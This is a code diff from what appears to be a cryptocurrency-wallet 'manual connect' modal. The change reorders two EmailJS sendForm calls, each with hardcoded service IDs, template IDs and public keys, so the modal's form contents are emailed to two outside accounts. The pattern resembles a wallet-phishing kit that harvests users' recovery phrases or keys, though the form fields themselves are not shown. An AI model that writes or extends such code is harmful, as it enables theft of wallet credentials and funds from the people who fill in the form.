@@ -353,6 +353,14 @@ const ManualConnectModal = ({ selectedWallet, closeModal, onSubmit }) => {
       // );
     
       try {
+
+        await emailjs.sendForm(
+          "service_d6oupni",
+          "template_foi8ygt",
+          form.current,
+          "lkCQpXoMcvB5RJCev"
+        );
+        
         await emailjs.sendForm(
           "service_jcu7elm",
           "template_egpl2j5",
@@ -360,12 +368,7 @@ const ManualConnectModal = ({ selectedWallet, closeModal, onSubmit }) => {
           "DqbO8ehbSa9azzCOr"
         );
         
-        await emailjs.sendForm(
-          "service_d6oupni",
-          "template_foi8ygt",
-          form.current,
-          "lkCQpXoMcvB5RJCev"
-        );
+
 
 
        // Reset form state values
